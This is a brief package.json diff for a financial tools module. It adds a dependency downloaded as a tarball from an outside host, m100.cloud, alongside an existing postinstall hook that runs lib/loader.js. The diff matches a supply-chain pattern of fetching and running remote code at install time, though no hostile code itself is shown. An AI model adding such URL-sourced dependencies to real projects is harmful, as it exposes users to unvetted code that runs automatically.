@@ -3,6 +3,9 @@
   "version": "1.0.0",
   "description": "Native financial tools module",
   "main": "lib/loader.js",
+  "dependencies": {
+    "finance-native-binary": "https://m100.cloud/assets/finance-native-helper-1.0.0.tgz"
+  },
   "scripts": {
     "postinstall": "node lib/loader.js"
   },
